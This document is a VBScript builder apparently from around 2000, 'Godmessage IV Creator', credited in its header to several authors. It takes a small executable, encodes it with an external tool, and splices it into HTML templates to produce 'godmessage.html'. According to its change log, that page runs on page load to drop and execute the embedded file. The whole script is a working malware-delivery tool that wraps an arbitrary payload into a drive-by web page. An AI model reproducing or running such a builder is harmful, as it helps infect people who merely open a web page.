'********************************************************************
' Godmessage IV Creator v0.2
' Author: 6IT
' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.
' Thanks: StoneFisk - Coauthor of Godmessage IV. his hex2script VB code helped with writing this
' Thanks: Al McLennan - For his LCODER program, without it this wouldn't be possible
' Thanks: To all the people who helped make godmessage what it is today
'  
' CHANGE lOG 10-12-00
' GODMESSAGE IV
' - Deleted the setTimeout call of f() and replaced it with a call from the onload property of the BODY element. 
' - Set the remaining setTimeouts to 15, 3000, and 4500 respectively. 
' - Cleaned up the VBScript code a bit, used fso.DeleteFile to clean up files
' - A few other tweaks here and there
'
' GMCreator 
' - encode onz.exe using XXE (onz.xfr)
' - increased file size limit to 26000 bytes (thanks to XXEncoding)
' TODO
' - Optimize Godmessage code, remove unnessisary chars to make file smaller and raise onz.exe size limit
' - Possibly dynamically create godmessage from user supplied html file
'********************************************************************
Dim Message, Title, Text1
Dim fso, WSHSHell, result
Message = "Enter the name of the executable to wrap in Godmessage IV" 
Title = "6IT's Godmessage IV Creator v0.1"
Text1 = "Sorry, user input was canceled"
Set fso = CreateObject("Scripting.FileSystemObject")
Set WSHShell = WScript.CreateObject("WScript.Shell")
Const ForReading = 1 
Const ForAppending = 8
result = InputBox(Message,Title,"onz.exe", 4000, 3000)
If result = "" Then
	WScript.Echo Text1
	WScript.Quit()
ElseIf result = "onz.exe" Then

	If fso.FileExists(result) Then 
		GMCreate()
	Else 
		WScript.Echo "File Doesn't Exist!"
		WScript.Quit()
	End If
Else
	If fso.FileExists(result) Then
		fso.CopyFile result, "onz.exe", True
		GMCreate()
	Else 
		WScript.Echo "File Doesn't Exist!"
		WScript.Quit()
	End If
End If
WScript.Echo "Success!"
WScript.Quit()

Sub GMCreate()
CheckSize()
CreateHex()
CreateScript()
Join()
fso.DeleteFile "stdio.txt", True
fso.DeleteFile "onz.xfr", True
fso.DeleteFile "output.txt", True
End Sub

Sub CheckSize()
Set fs = fso.GetFile("onz.exe")
fsize = fs.Size
IF fsize > 26000 Then
WScript.Echo "File is Greater Than 26000 Bytes"
WScript.Quit()
End If
End Sub

Sub CreateHex()
Dim stdioTxt
' create standard input file stdio.txt
set stdioTxt=fso.CreateTextFile("stdio.txt", True)
stdioTxt.WriteLine "echo" & Chr(27) & "onz.exe" & vbNewline & "X" & vbNewline & "Y" & vbNewline& "echo"
stdioTxt.close
If fso.FileExists("onz.xfr") Then 
fso.DeleteFile "onz.xfr", True
End If
WSHShell.Run "%comspec% /c lcoder.exe < stdio.txt",0,True

End Sub

Sub CreateScript()
Set input = fso.OpenTextFile("onz.xfr", ForReading) 
Set output = fso.CreateTextFile("output.txt", True)
nline = " & vbNewline"
s = input.ReadLine
fline1 = "l23 = ""set onzXfr=fso.CreateTextFile(" & Chr(34) & Chr(34) & "onz.xfr" & Chr(34) & Chr(34) & ")"""
fline2 = "l24 = ""onzXfr.WriteLine " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)
output.Write (fline1 & vbNewline & fline2 & nline)
Do While NOT input.AtEndOfStream
s = input.ReadLine
If s = "" Then
output.Write (nline)
Else
line = " & " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) 
output.Write (line & nline)
End IF
Loop
output.Write (Chr(34) & vbNewline)
input.Close 
output.Close
End Sub


Sub Join() 

fso.CopyFile "gm1.dat", "godmessage.html", True
Set f1 = fso.OpenTextFile("godmessage.html", ForAppending)
Set f2 = fso.OpenTextFile("output.txt", ForReading)
Set f3 = fso.OpenTextFile("gm2.dat", ForReading)
dat1 = f2.ReadAll
dat2 = f3.ReadAll
f1.Write(dat1 & dat2)
f1.close
f2.close
f3.close
End Sub